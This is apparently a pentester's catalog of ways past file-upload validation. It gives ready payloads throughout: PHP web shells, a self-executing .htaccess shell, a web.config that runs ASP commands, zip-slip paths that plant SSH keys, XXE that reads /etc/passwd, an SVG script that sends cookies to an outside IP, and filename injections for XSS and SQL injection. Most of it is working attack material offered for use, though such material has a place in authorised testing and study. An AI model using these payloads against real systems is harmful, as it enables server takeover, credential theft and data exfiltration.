# Upload Validation Bypass Catalog

Match the bypass to the check you observed failing in the Phase-1 baseline.

| Observed check | Bypass family |
|---|---|
| JS/`accept` attr only | Replay raw request via proxy — no bypass needed |
| Extension blocklist | Alternate extensions, case, double ext, trailing dot/space, `.htaccess` |
| Extension allowlist | Double ext (`shell.php.jpg`), null byte, `.htaccess` re-map, SVG, zip-slip |
| `Content-Type` header check | Spoof the multipart part CT |
| Magic-byte / libmagic sniff | Magic prefix, polyglot |
| Image re-encode (GD/Imagick) | EXIF/comment polyglot that survives re-encode; IDAT-embedded PHP; or pivot to parser bugs |
| Archive extraction | zip-slip entry names, symlink entries |

## 1. Extension tricks

Executable alternates per stack:

- **PHP**: `.php .php3 .php4 .php5 .php7 .phtml .pht .phar .phps .pgif .inc .module`
- **JSP (Tomcat/Java)**: `.jsp .jspx .jsw .jsv .jspf .wss .do .action`
- **ASP/ASP.NET (IIS)**: `.asp .aspx .ashx .asmx .asa .cer .soap .config`
- **Perl/CGI/other**: `.pl .cgi .sh .py` (needs handler mapping)

Manipulations (edit `filename="..."` in the multipart part):

```
shell.pHp                 # case — beats case-sensitive blocklists
shell.php.jpg             # double ext — Apache AddHandler misconfig executes it
shell.jpg.php             # beats "first extension" checks
shell.php.                # trailing dot — Windows strips it on write
shell.php%20              # trailing space (send literally: 'shell.php ')
shell.php%00.jpg          # null byte — edit the raw byte 0x00 in Repeater/hex;
                          # legacy PHP<5.3 / old Java File APIs truncate at NUL
shell.php::$DATA          # NTFS alternate data stream (IIS legacy)
shell%2Ephp               # encoded dot if the server decodes after validating
file.phtml / file.phar    # commonly missing from blocklists
```

Also fuzz: very long filenames (truncation can drop the appended safe
extension), Unicode dots (`shell.php` with U+FF0E), and mixed separators.

## 2. Content-Type spoofing

In the multipart part only (not the outer request header):

```
Content-Disposition: form-data; name="file"; filename="shell.php"
Content-Type: image/jpeg
```

Try `image/png`, `image/gif`, `image/jpeg`, `application/pdf`,
`text/plain`. Some validators compare against the *form field* `type`
parameter instead — mutate both.

## 3. Magic bytes

Prefix the payload so content sniffers classify it as an image. The server
executes it anyway if the handler is extension-based.

```
GIF89a;
<?php system($_GET['c']); ?>
```

Other prefixes: PNG `\x89PNG\r\n\x1a\n`, JPEG `\xFF\xD8\xFF\xE0`,
PDF `%PDF-1.4`, BMP `BM`. `GIF89a` is best for PHP because every byte is
printable and it never breaks the PHP parser.

## 4. Polyglots (survive re-encoding)

If the app re-encodes images (GD `imagecreatefromjpeg` → `imagejpeg`), raw
prefixes are destroyed. Options:

- **EXIF comment**: `exiftool -Comment='<?php system($_GET["c"]); ?>' pic.jpg`
  — survives metadata-preserving pipelines.
- **PNG IDAT-embedded PHP**: craft pixel data whose compressed stream
  contains the PHP tag so it survives GD re-encode (precomputed payloads
  exist publicly; generate once, reuse).
- A polyglot needs an *execution* path: executable extension, `.htaccess`
  mapping, or LFI `include()` of the image (pair with the
  `path-traversal-testing` skill — `include('/uploads/pic.jpg')` runs it).

## 5. `.htaccess` upload (Apache)

If uploads land where `AllowOverride` permits and `.htaccess` isn't blocked:

```
AddType application/x-httpd-php .s9l
```

or make an *image* extension executable in this dir only:

```
<FilesMatch "shell\.jpg$">
  SetHandler application/x-httpd-php
</FilesMatch>
```

A self-contained variant makes `.htaccess` itself the shell:

```
AddType application/x-httpd-php .htaccess
# <?php system($_GET['c']); ?>
```

Then request `/uploads/.htaccess?c=id`.

## 6. `web.config` upload (IIS)

`web.config` in the upload dir can re-enable handlers or carry inline ASP:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<configuration>
  <system.webServer>
    <handlers accessPolicy="Read, Script, Write">
      <add name="wcfg" path="web.config" verb="*"
           modules="IsapiModule"
           scriptProcessor="%windir%\system32\inetsrv\asp.dll"
           resourceType="Unspecified" requireAccess="Write"
           preCondition="bitness64" />
    </handlers>
    <security><requestFiltering>
      <fileExtensions><remove fileExtension=".config" /></fileExtensions>
      <hiddenSegments><remove segment="web.config" /></hiddenSegments>
    </requestFiltering></security>
  </system.webServer>
</configuration>
<!-- ASP code below executes when web.config is requested -->
<%
Response.Write(CreateObject("WScript.Shell").Exec("cmd /c whoami").StdOut.ReadAll())
%>
```

Request `/uploads/web.config` to run it.

## 7. SVG — stored XSS and XXE

SVG is "an image" to validators but a full XML/script document to browsers.

Stored XSS (fires when served inline as `image/svg+xml`):

```xml
<svg xmlns="http://www.w3.org/2000/svg" onload="alert(document.domain)">
  <script>fetch('https://198.51.100.9/c?d='+document.cookie)</script>
</svg>
```

XXE / SSRF against server-side rasterizers (ImageMagick, Batik, resvg):

```xml
<?xml version="1.0"?>
<!DOCTYPE svg [ <!ENTITY x SYSTEM "http://<id>.oast.pro/xxe"> ]>
<svg xmlns="http://www.w3.org/2000/svg"><text>&x;</text></svg>
```

A DNS-only interactsh hit still proves the entity resolved. File-read
variant: `<!ENTITY x SYSTEM "file:///etc/passwd">` reflected into rendered
text/thumbnail.

## 8. Zip-slip (archive path traversal)

When the server **extracts** uploads (plugin/theme/import/restore), entry
names control the write path:

```
../../../../../../var/www/html/shell.php          # unix webroot
..\..\..\..\inetpub\wwwroot\shell.aspx            # windows webroot
../../../../home/app/.ssh/authorized_keys         # key plant
```

Build with `scripts/gen_upload_payloads.py` (uses `zipfile.ZipInfo` with the
raw traversal name — most extractors that join without normalizing lose).
Also try tar variants and **symlink** entries pointing at `/etc/passwd`,
then download the "extracted" file back.

## 9. Filename-field injection

The `filename` parameter is attacker input in its own right:

- `filename="../../../var/www/html/shell.php"` — traversal on write.
- `filename="<img src=x onerror=alert(1)>.png"` — stored XSS where
  filenames are rendered.
- `filename="sleep(10)-- -.png"` / `'"` — SQLi if names hit a query.
- Overlong names → truncation of server-appended safe suffixes.
